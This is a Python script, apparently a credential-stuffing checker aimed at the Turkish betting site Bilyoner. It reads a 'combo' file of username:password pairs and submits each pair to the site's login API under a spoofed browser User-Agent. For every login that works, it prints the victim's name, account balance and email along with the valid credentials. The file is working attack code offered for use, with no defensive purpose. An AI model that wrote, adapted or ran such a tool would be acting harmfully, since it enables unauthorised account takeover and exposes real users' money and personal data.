import requests
import json
import os

try:
    from cfonts import render
except:
    os.system('pip install python-cfonts')

bilyoner = render(' bilyoner', colors=['white', 'blue'], align='center')
print(f'''\n
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓   
     
                      {bilyoner}
    

   ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛    
''')

class bilyonerBot:
    def __init__(self):
        self.url = "https://aping.bilyoner.com/v2/oauth-manager/users/login"
        self.headers = {
            "Content-Type": "application/json;charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 OPR/73.0.3856.396",
            "Accept": "application/json, text/plain, */*"
        }

    def x1(self, u, p):
        y = {"username": u, "password": p, "clientId": "mobile.bilyoner.com"}
        z = requests.post(self.url, headers=self.headers, json=y)
        if z.status_code == 200:
            try:
                j = z.json()
                a = j.get("balance", "Bilinmiyor")
                b = j.get("fullName", "Bilinmiyor")
                c = j.get("email", "Bilinmiyor")

                print(f"\n{'-'*40}")
                print(f" İsim          : {b}")
                print(f" Bakiye        : {a} ₺")
                print(f" Email         : {c}")
                print(f"{'-'*40}\n")
                return True
            except json.JSONDecodeError:
                print("JSON çözümlenemedi.")
                return False
        else:
            print(f"İstek başarısız ❌: {z.status_code}")
            return False

    def y2(self):
        dosya_yolu = input("~ Combo dosyası yolunu girin: ")
        try:
            with open(dosya_yolu, "r") as f:
                for line in f:
                    if ":" in line:
                        u, p = line.strip().split(":")
                        if self.x1(u, p):
                            print(f"Başarılı ✅: {u} {p}")
                        else:
                            print(f"Başarısız ❌: {u} {p}")
        except FileNotFoundError:
            print(f"{dosya_yolu} bulunamadı.")

bot = bilyonerBot()
bot.y2()
